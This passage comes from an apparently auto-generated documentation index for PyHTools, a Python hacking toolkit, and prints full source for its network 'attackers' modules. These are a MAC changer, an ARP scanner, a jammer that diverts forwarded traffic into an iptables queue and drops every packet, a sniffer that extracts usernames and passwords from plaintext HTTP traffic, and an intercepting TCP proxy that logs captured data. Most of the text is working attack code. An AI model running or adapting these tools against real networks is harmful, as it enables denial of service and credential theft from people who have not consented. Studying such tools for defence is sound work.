status\n</code></pre>"},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.machngr.generate_random_mac","title":"<code>generate_random_mac()</code>","text":"<p>generates and returns a random mac address</p> <p>Returns:</p> Name Type Description <code>str</code> <code>str</code> <p>New MAC Address</p> Source code in <code>pyhtools\\attackers\\Network\\machngr.py</code> <pre><code>def generate_random_mac() -&gt; str:\n'''generates and returns a random mac address\n    Args:\n        None\n    Returns: \n        str: New MAC Address\n    '''\nrand_mac = '00'\nfor _ in range(5):\nrand_mac += ':' + format(randint(0, 255), 'x')\nreturn rand_mac\n</code></pre>"},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.machngr.get_arguments","title":"<code>get_arguments()</code>","text":"<p>get arguments from the cli</p> <p>Returns:</p> Name Type Description <code>tuple</code> <p>contains (interface, new_mac)</p> Source code in <code>pyhtools\\attackers\\Network\\machngr.py</code> <pre><code>def get_arguments():\n'''get arguments from the cli\n    Args:\n        None\n    Returns: \n        tuple: contains (interface, new_mac)\n    '''\nparser = argparse.ArgumentParser(description='Mac Changer')\nparser.add_argument('-i', '--interface', dest='interface',\nhelp='Choose interface')\nparser.add_argument('-m', '--new-mac', dest='new_mac',\nhelp='Choose new mac address or enter random to generate random mac.')\nargs = parser.parse_args()\nINTERFACE = args.interface\nNEW_MAC = args.new_mac\ndel parser\nif NEW_MAC == 'random':\nprint(BRIGHT_WHITE + '[*] Generating Random Mac')\nNEW_MAC = generate_random_mac()\nreturn INTERFACE, NEW_MAC\n</code></pre>"},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.machngr.run_macchanger","title":"<code>run_macchanger(interface, new_mac)</code>","text":"<p>run mac changer commands based on OS</p> <p>Parameters:</p> Name Type Description Default <code>intrfc</code> <code>str</code> <p>network interface whose MAC address needs to be changed</p> required <code>new_mac</code> <code>str</code> <p>new MAC address for the network interface</p> required <p>Returns:</p> Type Description <p>None</p> Source code in <code>pyhtools\\attackers\\Network\\machngr.py</code> <pre><code>def run_macchanger(interface, new_mac):\n'''run mac changer commands based on OS\n    Args:\n        intrfc (str): network interface whose MAC address needs to be changed\n        new_mac (str): new MAC address for the network interface\n    Returns: \n        None\n    '''\nif os.name == 'posix':\nINTERFACE, NEW_MAC = interface, new_mac\nMAC_CHANGE_STATUS = change_mac(INTERFACE, NEW_MAC)\ncheck_mac_change(INTERFACE, NEW_MAC, MAC_CHANGE_STATUS)\nelse:\nprint(\nBRIGHT_RED + \"[\\U0001f636] Mac changer only works on linux machines with admin privileges.\")\n</code></pre>"},{"location":"code-docs/network-attackers/#network-jammer","title":"Network Jammer","text":""},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.network_jammer.forward_packets","title":"<code>forward_packets()</code>","text":"<p>configures the mitm for incoming request packets into a queue.</p> <p>Returns:</p> Type Description <p>None</p> Source code in <code>pyhtools\\attackers\\Network\\network_jammer.py</code> <pre><code>def forward_packets():\n'''\n    configures the mitm for incoming request packets\n    into a queue.\n    Args:\n        None\n    Returns: \n        None\n    '''\n# executing the following command\n# iptables -I FOWARD -j NFQUEUE --queue-num (any number)\n# sudo iptables -I FORWARD -j NFQUEUE --queue-num 0\n# -I -&gt; insert (packet into a chain specified by the user)\n# -j -&gt; jump if the packet matches the target.\n# --queue-num -&gt; jump to specfic queue number\ncall('sudo iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)\n</code></pre>"},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.network_jammer.process_packet","title":"<code>process_packet(packet)</code>","text":"<p>process received packet, everytime a packet is received. prints the packet received in the queue and drops packet</p> <p>Parameters:</p> Name Type Description Default <code>packet</code> <code>scapy.IP</code> <p>IP packet from netfiterqueue/iptables </p> required <p>Returns:</p> Type Description <p>None</p> Source code in <code>pyhtools\\attackers\\Network\\network_jammer.py</code> <pre><code>def process_packet(packet):\n'''\n    process received packet, everytime a packet is received.\n    prints the packet received in the queue and drops packet\n    Args:\n        packet (scapy.IP): IP packet from netfiterqueue/iptables \n    Returns: \n        None\n    '''\nprint(packet)\npacket.drop()\n</code></pre>"},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.network_jammer.reset_config","title":"<code>reset_config()</code>","text":"<p>resets the configurations changed while exectution of the program to  its original configuration</p> <p>Returns:</p> Type Description <p>None</p> Source code in <code>pyhtools\\attackers\\Network\\network_jammer.py</code> <pre><code>def reset_config():\n'''\n    resets the configurations changed while exectution of the program to \n    its original configuration\n    Args:\n        None\n    Returns: \n        None\n    '''\ncall('sudo iptables --flush', shell=True)\n</code></pre>"},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.network_jammer.run","title":"<code>run()</code>","text":"<p>Start network jammer</p> <p>Returns:</p> Type Description <p>None</p> Source code in <code>pyhtools\\attackers\\Network\\network_jammer.py</code> <pre><code>def run():\n'''Start network jammer\n    Args:\n        None\n    Returns:\n        None\n    '''\nprint('[*] configuring packet receiver...')\nforward_packets()\nprint('[*] packet receiver configured successfully.\\n')\nprint('[*] Creating Queue to start receiving packets.')\ntry:\nqueue = netfilterqueue.NetfilterQueue()\n# Bind queue with queue-number 0\nqueue.bind(0, process_packet)\nqueue.run()\nexcept OSError as e:\nprint('[-] Run script with root priviliges.')\nprint(e)\nexcept Exception:\nprint('[-] An Exception occurred while creating queue.\\n', Exception)\nfinally:\nprint('[*] Restoring previous configurations.. please be patient...')\nreset_config()\nprint('[-] Program stopped.')\n</code></pre>"},{"location":"code-docs/network-attackers/#network-scanner","title":"Network Scanner","text":""},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.nwscan.get_args","title":"<code>get_args()</code>","text":"<p>get arguments from the command line.</p> <p>Returns:</p> Name Type Description <code>str</code> <p>IP address/range</p> Source code in <code>pyhtools\\attackers\\Network\\nwscan.py</code> <pre><code>def get_args():\n'''get arguments from the command line.\n    Args:\n        None\n    Returns: \n        str: IP address/range\n    '''\nparser = argparse.ArgumentParser(description='search for other devices on the network')\nparser.add_argument('-ip', help='ip or ip range of the target device')\nargs = parser.parse_args()\nreturn args.ip\n</code></pre>"},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.nwscan.print_clients","title":"<code>print_clients(clients)</code>","text":"<p>prints discovered clients on the network ip range.</p> <p>Parameters:</p> Name Type Description Default <code>clients</code> <code>list</code> <p>list of discovered ip addresses</p> required <p>Returns:</p> Type Description <p>None</p> Source code in <code>pyhtools\\attackers\\Network\\nwscan.py</code> <pre><code>def print_clients(clients):\n'''prints discovered clients on the network ip range.\n    Args: \n        clients (list): list of discovered ip addresses\n    Returns: \n        None\n    '''\nprint(BRIGHT_YELLOW + '________________________________________________________')\nprint(BRIGHT_YELLOW + 'IP\\t\\t\\tMAC Address')\nprint(BRIGHT_YELLOW + '--------------------------------------------------------')\nfor client in clients:\nprint( BRIGHT_WHITE + client.get('ip') + '\\t\\t' + client.get('mac'))\nprint(BRIGHT_YELLOW + '________________________________________________________\\n')\n</code></pre>"},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.nwscan.run_nwscan","title":"<code>run_nwscan(ip)</code>","text":"<p>starts network scanner for specified ip range or ip.</p> <p>Parameters:</p> Name Type Description Default <code>ip</code> <code>str</code> <p>IP address/range of scan target</p> required <p>Returns:</p> Type Description <p>None</p> Source code in <code>pyhtools\\attackers\\Network\\nwscan.py</code> <pre><code>def run_nwscan(ip:str):\n'''starts network scanner for specified ip range or ip.\n    Args: \n        ip (str): IP address/range of scan target\n    Returns: \n        None\n    '''\ntry:\nprint(BRIGHT_YELLOW + '[*] Starting Network Scanner....')\nclients = scan(ip)\nprint_clients(clients)\nexcept Exception as e:\nprint(BRIGHT_RED + '[-] Exception : ', e)\n</code></pre>"},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.nwscan.scan","title":"<code>scan(ip)</code>","text":"<p>scans ip range for clients and returns discovered clients list.</p> <p>Parameters:</p> Name Type Description Default <code>ip</code> <code>str</code> <p>IP address/range of client to be discovered</p> required <p>Returns:</p> Name Type Description <code>list</code> <p>IP addresses of discovered network clients</p> Source code in <code>pyhtools\\attackers\\Network\\nwscan.py</code> <pre><code>def scan(ip):\n'''scans ip range for clients and returns discovered clients list.\n    Args: \n        ip (str): IP address/range of client to be discovered\n    Returns: \n        list: IP addresses of discovered network clients  \n    '''\nprint(BRIGHT_WHITE + f'[*] Discovering Clients {ip}')\narp_req = sp.ARP(pdst=ip)\nbrdcst = sp.Ether(dst='ff:ff:ff:ff:ff:ff')\npacket = brdcst / arp_req\nresponded_list = sp.srp(packet, timeout=2, retry=3,verbose=False)[0]\nclients = []\nfor ele in responded_list:\nclients.append({\"ip\": ele[1].psrc, 'mac': ele[1].hwsrc})\nreturn clients\n</code></pre>"},{"location":"code-docs/network-attackers/#packet-sniffer","title":"Packet Sniffer","text":""},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.pkt_sniffer.check_args","title":"<code>check_args(intrfce)</code>","text":"<p>checks if the passed arguments are valid. if valid returns True.</p> <p>Parameters:</p> Name Type Description Default <code>intrfce</code> <code>str</code> <p>network inferface on which sniffing action is be performed</p> required <p>Returns:</p> Name Type Description <code>bool</code> <p>returns True if args are valid else False</p> Source code in <code>pyhtools\\attackers\\Network\\pkt_sniffer.py</code> <pre><code>def check_args(intrfce):\n'''checks if the passed arguments are valid. if valid returns True.\n\tArgs:\n\t\tintrfce (str): network inferface on which sniffing action is be performed\n\tReturns: \n\t\tbool: returns True if args are valid else False\n\t'''\nif not intrfce:\nexit(BRIGHT_RED + \"[-] Please enter interface argument, use -h or --help for more info\")\nreturn True\n</code></pre>"},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.pkt_sniffer.get_args","title":"<code>get_args()</code>","text":"<p>get arguments from the command line.</p> <p>Returns:</p> Name Type Description <code>str</code> <p>network interface</p> Source code in <code>pyhtools\\attackers\\Network\\pkt_sniffer.py</code> <pre><code>def get_args():\n'''get arguments from the command line.\n\tArgs:\n\t\tNone\n\tReturns: \n\t\tstr: network interface\n\t'''\nparser = argparse.ArgumentParser(description='Packet Sniffer')\nparser.add_argument('-i', '--interface', dest='interface', help='choose interface')\nargs = parser.parse_args()\ninterface = args.interface\ndel parser\nreturn interface\n</code></pre>"},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.pkt_sniffer.get_login_info","title":"<code>get_login_info(packet)</code>","text":"<p>extract login information from the sniffed packet.</p> <p>Parameters:</p> Name Type Description Default <code>packet</code> <code>scapy.IP</code> <p>scapy packet</p> required <p>Returns:</p> Name Type Description <code>str</code> <p>URL with login information</p> Source code in <code>pyhtools\\attackers\\Network\\pkt_sniffer.py</code> <pre><code>def get_login_info(packet):\n'''extract login information from the sniffed packet.\n\tArgs: \n\t\tpacket (scapy.IP): scapy packet\n\tReturns: \n\t\tstr: URL with login information\n\t'''\nif packet.haslayer(sp.Raw):\nload = str(packet[sp.Raw].load,encoding='utf-8')\nkeywords = [\"username\", \"user\", \"password\", \"pass\", \"login\"]\nfor keyword in keywords:\nif keyword in load:\nreturn load\n</code></pre>"},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.pkt_sniffer.get_url","title":"<code>get_url(packet)</code>","text":"<p>extract url from the packet</p> <p>Parameters:</p> Name Type Description Default <code>packet</code> <code>scapy.IP</code> <p>scapy packet</p> required <p>Returns:</p> Name Type Description <code>str</code> <p>URL inside the HTTP packet</p> Source code in <code>pyhtools\\attackers\\Network\\pkt_sniffer.py</code> <pre><code>def get_url(packet):\n'''extract url from the packet\n\tArgs: \n\t\tpacket (scapy.IP): scapy packet\n\tReturns: \n\t\tstr: URL inside the HTTP packet\n\t'''\nprint('IN GET URL')\nreturn str(packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path, encoding='utf-8')\n</code></pre>"},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.pkt_sniffer.process_sniffed_pkt","title":"<code>process_sniffed_pkt(packet)</code>","text":"<p>analyze the captured packet for login information.</p> <p>Parameters:</p> Name Type Description Default <code>packet</code> <code>scapy.IP</code> <p>scapy packet</p> required <p>Returns:</p> Type Description <p>None</p> Source code in <code>pyhtools\\attackers\\Network\\pkt_sniffer.py</code> <pre><code>def process_sniffed_pkt(packet):\n'''analyze the captured packet for login information.\n\tArgs: \n\t\tpacket (scapy.IP): scapy packet\n\tReturns: \n\t\tNone\n\t'''\nif packet.haslayer(http.HTTPRequest):\nurl = get_url(packet)\nprint(BRIGHT_WHITE + '[+] Http Request &gt;&gt; ' + url + '\\n')\nlogin_info = get_login_info(packet)\nif login_info:\nprint(BRIGHT_YELLOW + '\\n\\n[+] Contains possible Login information :\\n' + login_info + '\\n\\n')\n</code></pre>"},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.pkt_sniffer.sniffer","title":"<code>sniffer(intrfce, args_status)</code>","text":"<p>sniffs packets over the network.</p> <p>Parameters:</p> Name Type Description Default <code>intrfce</code> <code>str</code> <p>network interface for sniffing action</p> required <code>args_status</code> <code>bool</code> <p>True if cli args are valid else False</p> required <p>Returns:</p> Type Description <p>None</p> Source code in <code>pyhtools\\attackers\\Network\\pkt_sniffer.py</code> <pre><code>def sniffer(intrfce, args_status):\n'''sniffs packets over the network.\n\tArgs: \n\t\tintrfce (str): network interface for sniffing action\n\t\targs_status (bool): True if cli args are valid else False\n\tReturns: \n\t\tNone\n\t'''\ntry:\nif args_status:\nsp.sniff(iface=intrfce, store=False, prn=process_sniffed_pkt)\nexcept Exception as e:\nprint(BRIGHT_RED + '[-] An error occured while sniffing...')\nprint(e)\n</code></pre>"},{"location":"code-docs/network-attackers/#tcp-proxy","title":"TCP proxy","text":"<p>This is still work in progress, It might be unstable.</p>"},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.tcp_proxy.TCProxy","title":"<code>TCProxy</code>","text":"<p>TCP proxy</p> Source code in <code>pyhtools\\attackers\\Network\\tcp_proxy.py</code> <pre><code>class TCProxy:\n'''TCP proxy'''\ndef __init__(self, filepath: str = None) -&gt; None:\n'''TCProxy class constructor\n        Args: \n            filepath: path to file for storing captured data\n        Returns: \n            None\n        '''\nself.__file_name = filepath\nif self.__file_name and os.path.isfile(self.__file_name):\nlogging.warning(\nf'{self.__file_name} file data will be overwritten!')\nwith open(self.__file_name, 'wb') as f:\nf.write(b'')\nelif self.__file_name:\nlogging.info(\nf'Captured data will be saved in file {self.__file_name}')\ndef receive_from(self, conn: socket.socket):\n'''Accepts socket data and returns data from the buffer\n        Args:\n            conn (socket.socket): socket connection for reception\n        Returns:\n            bytes: returns received data\n        '''\nconn.settimeout(5)\ntry:\nbuff = b''\nwhile True:\ndata = conn.recv(4096)\nif not data:\nbreak\nbuff += data\nexcept Exception:\npass\nreturn buff\n@staticmethod\ndef handler(func):\n'''decorator used for packet modification\n        Args:\n            func (function): method function to be wrapped \n        Returns:\n            function: wrapped function with error handling\n        '''\n@wraps(func)\ndef wrapper(*args, **kwargs):\nres = None\ntry:\nres = func(**args, **kwargs)\nreturn res\nexcept Exception as e:\nlogging.error(e)\nreturn wrapper\n@handler\ndef request_handler(self, buff: bytes):\n'''manipulate buffer data before sending request to remote host\n        Args:\n            buff (bytes): received data\n        Returns:\n            bytes: received data after handling request\n        '''\nreturn buff\n@handler\ndef response_handler(self, buff: bytes):\n'''manipulate buffer data after receiving from remote host\n        Args:\n            buff (bytes): received data\n        Returns:\n            bytes: received data after handling request\n        '''\nreturn buff\ndef __write_data(self, data):\n'''Write Data to file\n        Args:\n            data (bytes): data to be written to the file\n        Returns:\n            None\n        '''\nif not isinstance(data, bytes):\ndata = bytes(data, encoding='utf-8')\nif self.__file_name:\nwith open(self.__file_name, 'ab') as f:\nf.write(data)\ndef proxy_handler(self, client_sock: socket.socket, remote_host: str, remote_port: int, receive_first: bool, v4: bool = True):\n'''handles proxy connections\n        Args:\n            client_sock (socket.socket): client TCP socket connection\n            remote_host (str): IP address of the remote host\n            remote_port (int): port of remote host\n            receive_first (bool): if True proxy will start receiving data else it'll send\n            v4 (bool): if True uses IP v4 address else IP v6\n        Returns:\n            None\n        '''\naddress_family = socket.AF_INET if v4 else socket.AF_INET6\nremote_sock = socket.socket(address_family, socket.SOCK_STREAM)\nremote_sock.connect((remote_host, remote_port))\nremote_buff = b''\nif receive_first:\nremote_buff = self.receive_from(client_sock)\nself.__write_data(remote_buff)\nremote_buff = self.response_handler(remote_buff)\nif len(remote_buff):\nlogging.info(f'[&lt;--] Send {len(remote_buff)} bytes to localhost')\nclient_sock.send(remote_buff)\nwhile True:\n# data from localhost to remote\nlocal_buff = self.receive_from(client_sock)\nif len(local_buff):\nlogging.info(\nf'[--&gt;] Received {len(local_buff)} bytes from localhost')\nlocal_buff = self.request_handler(local_buff)\nremote_sock.send(local_buff)\nlogging.info(f'[--&gt;] Sent to remote host')\n# data from remote to localhost\nremote_buff = self.response_handler(remote_buff)\nif len(remote_buff):\nlogging.info(\nf'[&lt;--] Received {len(remote_buff)} bytes from remote host')\nclient_sock.send(remote_buff)\nremote_buff = self.response_handler(remote_buff)\nclient_sock.send(remote_buff)\nlogging.info(f'[&lt;--] Sent to localhost')\n# if no data is received close sockets\nif not len(local_buff) or not len(remote_buff):\nremote_sock.close()\nclient_sock.close()\nlogging.info('Closing connections due to no incoming data')\nbreak\ndef serve_proxy(self,  remote_host: str, remote_port: int, host: str = '0.0.0.0', port: int = 8080, max_conns: int = 5, receive_first: bool = False, v4: bool = True):\n'''Starts Proxy Server\n        Args:\n            remote_host (str): IP address of the remote host\n            remote_port (int): port of remote host\n            host (str): ip address of binding interface (default = '0.0.0.0', listens on all interfaces)\n            port (int): port address of binding interface\n            max_conns (int): maximum number of connections to listen for\n            receive_first (bool): if True proxy will start receiving data else it'll send\n            v4 (bool): if True uses IP v4 address else IP v6\n        Returns:\n            None\n        '''\naddress_family = socket.AF_INET if v4 else socket.AF_INET6\nserver = socket.socket(address_family, socket.SOCK_STREAM)\nserver.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\ntry:\nserver.bind((host, port))\nexcept Exception as e:\nlogging.error(f'Cannot bind: {e}')\nlogging.info(\nf'Listening on {host}:{port} with maximum {max_conns} connections')\nserver.listen(max_conns)\nwhile True:\n# accept client connection request\nclient_sock, addr = server.accept()\nlogging.info(f'Incoming from {addr[0]}:{addr[1]}')\n# start proxy thread\n# proxy_handler(self, client_sock: socket.socket, remote_host: str, remote_port: int, receive_first: bool, v4: bool = True)\nthread = Thread(target=self.proxy_handler, args=(\nclient_sock, remote_host, remote_port, receive_first, v4))\ntry:\nthread.start()\nexcept Exception as e:\nlogging.error(f'Error in Thread: {e}')\n</code></pre>"},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.tcp_proxy.TCProxy.__init__","title":"<code>__init__(filepath=None)</code>","text":"<p>TCProxy class constructor</p> <p>Parameters:</p> Name Type Description Default <code>filepath</code> <code>str</code> <p>path to file for storing captured data</p> <code>None</code> <p>Returns:</p> Type Description <code>None</code> <p>None</p> Source code in <code>pyhtools\\attackers\\Network\\tcp_proxy.py</code> <pre><code>def __init__(self, filepath: str = None) -&gt; None:\n'''TCProxy class constructor\n    Args: \n        filepath: path to file for storing captured data\n    Returns: \n        None\n    '''\nself.__file_name = filepath\nif self.__file_name and os.path.isfile(self.__file_name):\nlogging.warning(\nf'{self.__file_name} file data will be overwritten!')\nwith open(self.__file_name, 'wb') as f:\nf.write(b'')\nelif self.__file_name:\nlogging.info(\nf'Captured data will be saved in file {self.__file_name}')\n</code></pre>"},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.tcp_proxy.TCProxy.__write_data","title":"<code>__write_data(data)</code>","text":"<p>Write Data to file</p> <p>Parameters:</p> Name Type Description Default <code>data</code> <code>bytes</code> <p>data to be written to the file</p> required <p>Returns:</p> Type Description <p>None</p> Source code in <code>pyhtools\\attackers\\Network\\tcp_proxy.py</code> <pre><code>def __write_data(self, data):\n'''Write Data to file\n    Args:\n        data (bytes): data to be written to the file\n    Returns:\n        None\n    '''\nif not isinstance(data, bytes):\ndata = bytes(data, encoding='utf-8')\nif self.__file_name:\nwith open(self.__file_name, 'ab') as f:\nf.write(data)\n</code></pre>"},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.tcp_proxy.TCProxy.handler","title":"<code>handler(func)</code>  <code>staticmethod</code>","text":"<p>decorator used for packet modification</p> <p>Parameters:</p> Name Type Description Default <code>func</code> <code>function</code> <p>method function to be wrapped </p> required <p>Returns:</p> Name Type Description <code>function</code> <p>wrapped function with error handling</p> Source code in <code>pyhtools\\attackers\\Network\\tcp_proxy.py</code> <pre><code>@staticmethod\ndef handler(func):\n'''decorator used for packet modification\n    Args:\n        func (function): method function to be wrapped \n    Returns:\n        function: wrapped function with error handling\n    '''\n@wraps(func)\ndef wrapper(*args, **kwargs):\nres = None\ntry:\nres = func(**args, **kwargs)\nreturn res\nexcept Exception as e:\nlogging.error(e)\nreturn wrapper\n</code></pre>"},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.tcp_proxy.TCProxy.proxy_handler","title":"<code>proxy_handler(client_sock, remote_host, remote_port, receive_first, v4=True)</code>","text":"<p>handles proxy connections</p> <p>Parameters:</p> Name Type Description Default <code>client_sock</code> <code>socket.socket</code> <p>client TCP socket connection</p> required <code>remote_host</code> <code>str</code> <p>IP address of the remote host</p> required <code>remote_port</code> <code>int</code> <p>port of remote host</p> required <code>receive_first</code> <code>bool</code> <p>if True proxy will start receiving data else it'll send</p> required <code>v4</code> <code>bool</code> <p>if True uses IP v4 address else IP v6</p> <code>True</code> <p>Returns:</p> Type Description <p>None</p> Source code in <code>pyhtools\\attackers\\Network\\tcp_proxy.py</code> <pre><code>def proxy_handler(self, client_sock: socket.socket, remote_host: str, remote_port: int, receive_first: bool, v4: bool = True):\n'''handles proxy connections\n    Args:\n        client_sock (socket.socket): client TCP socket connection\n        remote_host (str): IP address of the remote host\n        remote_port (int): port of remote host\n        receive_first (bool): if True proxy will start receiving data else it'll send\n        v4 (bool): if True uses IP v4 address else IP v6\n    Returns:\n        None\n    '''\naddress_family = socket.AF_INET if v4 else socket.AF_INET6\nremote_sock = socket.socket(address_family, socket.SOCK_STREAM)\nremote_sock.connect((remote_host, remote_port))\nremote_buff = b''\nif receive_first:\nremote_buff = self.receive_from(client_sock)\nself.__write_data(remote_buff)\nremote_buff = self.response_handler(remote_buff)\nif len(remote_buff):\nlogging.info(f'[&lt;--] Send {len(remote_buff)} bytes to localhost')\nclient_sock.send(remote_buff)\nwhile True:\n# data from localhost to remote\nlocal_buff = self.receive_from(client_sock)\nif len(local_buff):\nlogging.info(\nf'[--&gt;] Received {len(local_buff)} bytes from localhost')\nlocal_buff = self.request_handler(local_buff)\nremote_sock.send(local_buff)\nlogging.info(f'[--&gt;] Sent to remote host')\n# data from remote to localhost\nremote_buff = self.response_handler(remote_buff)\nif len(remote_buff):\nlogging.info(\nf'[&lt;--] Received {len(remote_buff)} bytes from remote host')\nclient_sock.send(remote_buff)\nremote_buff = self.response_handler(remote_buff)\nclient_sock.send(remote_buff)\nlogging.info(f'[&lt;--] Sent to localhost')\n# if no data is received close sockets\nif not len(local_buff) or not len(remote_buff):\nremote_sock.close()\nclient_sock.close()\nlogging.info('Closing connections due to no incoming data')\nbreak\n</code></pre>"},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.tcp_proxy.TCProxy.receive_from","title":"<code>receive_from(conn)</code>","text":"<p>Accepts socket data and returns data from the buffer</p> <p>Parameters:</p> Name Type Description Default <code>conn</code> <code>socket.socket</code> <p>socket connection for reception</p> required <p>Returns:</p> Name Type Description <code>bytes</code> <p>returns received data</p> Source code in <code>pyhtools\\attackers\\Network\\tcp_proxy.py</code> <pre><code>def receive_from(self, conn: socket.socket):\n'''Accepts socket data and returns data from the buffer\n    Args:\n        conn (socket.socket): socket connection for reception\n    Returns:\n        bytes: returns received data\n    '''\nconn.settimeout(5)\ntry:\nbuff = b''\nwhile True:\ndata = conn.recv(4096)\nif not data:\nbreak\nbuff += data\nexcept Exception:\npass\nreturn buff\n</code></pre>"},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.tcp_proxy.TCProxy.request_handler","title":"<code>request_handler(buff)</code>","text":"<p>manipulate buffer data before sending request to remote host</p> <p>Parameters:</p> Name Type Description Default <code>buff</code> <code>bytes</code> <p>received data</p> required <p>Returns:</p> Name Type Description <code>bytes</code> <p>received data after handling request</p> Source code in <code>pyhtools\\attackers\\Network\\tcp_proxy.py</code> <pre><code>@handler\ndef request_handler(self, buff: bytes):\n'''manipulate buffer data before sending request to remote host\n    Args:\n        buff (bytes): received data\n    Returns:\n        bytes: received data after handling request\n    '''\nreturn buff\n</code></pre>"},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.tcp_proxy.TCProxy.response_handler","title":"<code>response_handler(buff)</code>","text":"<p>manipulate buffer data after receiving from remote host</p> <p>Parameters:</p> Name Type Description Default <code>buff</code> <code>bytes</code> <p>received data</p> required <p>Returns:</p> Name Type Description <code>bytes</code> <p>received data after handling request</p> Source code in <code>pyhtools\\attackers\\Network\\tcp_proxy.py</code> <pre><code>@handler\ndef response_handler(self, buff: bytes):\n'''manipulate buffer data after receiving from remote host\n    Args:\n        buff (bytes): received data\n    Returns:\n        bytes: received data after handling request\n    '''\nreturn buff\n</code></pre>"},{"location":"code-docs/network-attackers/#pyhtools.attackers.Network.tcp_proxy.TCProxy.serve_proxy","title":"<code>serve_proxy(remote_host, remote_port, host='0.0.0.0', port=8080, max_conns=5, receive_first=False, v4=True)</code>","text":"<p>Starts Proxy Server</p> <p>Parameters:</p> Name Type Description Default <code>remote_host</code> <code>str</code> <p>IP address of the remote host</p> required <code>remote_port</code> <code>int</code> <p>port of remote host</p> required <code>host</code> <code>str</code> <p>ip address of binding interface (default = '0.0.0.0', listens on all interfaces)</p> <code>'0.0.0.0'</code> <code>port</code> <code>int</code> <p>port address of binding interface</p> <code>8080</code> <code>max_conns</code> <code>int</code> <p>maximum number of connections to listen for</p> <code>5</code> <code>receive_first</code> <code>bool</code> <p>if True proxy will start receiving data else it'll send</p> <code>False</code> <code>v4</code> <code>bool</code> <p>if True uses IP v4 address else IP v6</p> <code>True</code> <p>Returns:</p> Type Description <p>None</p> Source code in <code>pyhtools\\attackers\\Network\\tcp_proxy.py</code> <pre><code>def serve_proxy(self,  remote_host: str, remote_port: int, host: str = '0.0.0.0', port: int = 8080, max_conns: int = 5, receive_first: bool = False, v4: bool = True):\n'''Starts Proxy Server\n    Args:\n        remote_host (str): IP address of the remote host\n        remote_port (int): port of remote host\n        host (str): ip address of binding interface (default = '0.0.0.0', listens on all interfaces)\n        port (int): port address of binding interface\n        max_conns (int): maximum number of connections to listen for\n        receive_first (bool): if True proxy will start receiving data else it'll send\n        v4 (bool): if True uses IP v4 address else IP v6\n    Returns:\n        None\n    '''\naddress_family = socket.AF_INET if v4 else socket.AF_INET6\nserver = socket.socket(address_family, socket.SOCK_STREAM)\nserver.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\ntry:\nserver.bind((host, port))\nexcept Exception as e:\nlogging.error(f'Cannot bind: {e}')\nlogging.info(\nf'Listening on {host}:{port} with maximum {max_conns} connections')\nserver.listen(max_conns)\nwhile True:\n# accept client connection request\nclient_sock, addr = server.accept()\nlogging.info(f'Incoming from {addr[0]}:{addr[1]}')\n# start proxy thread\n# proxy_handler(self, client_sock: socket.socket, remote_host: str, remote_port: int, receive_first: bool, v4: bool = True)\nthread = Thread(target=self.proxy_handler, args=(\nclient_sock, remote_host, remote_port, receive_first, v4))\ntry:\nthread.start()\nexcept Exception as e:\nlogging.error(f'Error in Thread: {e}')\n</code></pre>"},{"location":"code-docs/pyhtools/","title":"PyHTools Package Documentation","text":"<p>Consists of documentation inside of <code>pyhtools</code> package</p>"},{"location":"code-docs/pyhtools/#main","title":"main","text":""},{"location":"code-docs/pyhtools/#pyhtools.__main__.start","title":"<code>start()</code>","text":"<p>Starts PyHtools UI</p> <p>Returns:</p> Type Description <p>None</p> Source code in <code>pyhtools\\__main__.py</code> <pre><code>def start():\n'''Starts PyHtools UI\n    Args:\n        None\n    Returns:\n        None\n    '''\nUI.banner()\ntry:\nrun(UI.run())\nexcept Exception as e:\nprint(e)\n</code></pre>"},{"location":"code-docs/pyhtools/#utils-module","title":"Utils Module","text":""},{"location":"code-docs/pyhtools/#pyhtools.utils.read_file_lines","title":"<code>read_file_lines(file_path)</code>","text":"<p>reads file and returns as list of str</p> <p>Parameters:</p> Name Type Description Default <code>file_path</code> <code>str</code> <p>path of file to be read</p> required <p>Returns:</p> Name Type Description <code>list</code> <code>list[str]</code> <p>lines read from file as list of str</p> Source code in <code>pyhtools\\utils.py</code> <pre><code>def read_file_lines(file_path: str) -&gt; list[str]:\n'''reads file and returns as list of str\n    Args:\n        file_path (str): path of file to be read\n    Returns:\n        list: lines read from file as list of str \n    '''\nlines = []\nif isfile(file_path):\nwith open(file_path, 'r') as f:\nlines = [line.strip() for line in f.readlines()]\nlogging.debug(f\"File Read: {file_path}\")\nelse:\nlogging.error(f\"File Not found at {file_path}\")\nreturn lines\n</code></pre>"},{"location":"code-docs/ui-doc/","title":"UI Documentation","text":""},{"location":"code-docs/ui-doc/#functions","title":"Functions","text":""},{"location":"code-docs/ui-doc/#pyhtools.UI.functions.banner","title":"<code>banner()</code>","text":"<p>prints PyHTools Banner on UI Screen</p> <p>Returns:</p> Type Description <p>None</p> Source code in <code>pyhtools\\UI\\functions.py</code> <pre><code>def banner():\n'''prints PyHTools Banner on UI Screen\n    Args:\n        None\n    Returns:\n        None\n    '''\nclrscr()\nprint(BRIGHT_YELLOW + pyfiglet.figlet_format('PyHTools'))\nprint(BRIGHT_YELLOW + '+' + '-'*42 + '+')\nprint(BRIGHT_WHITE 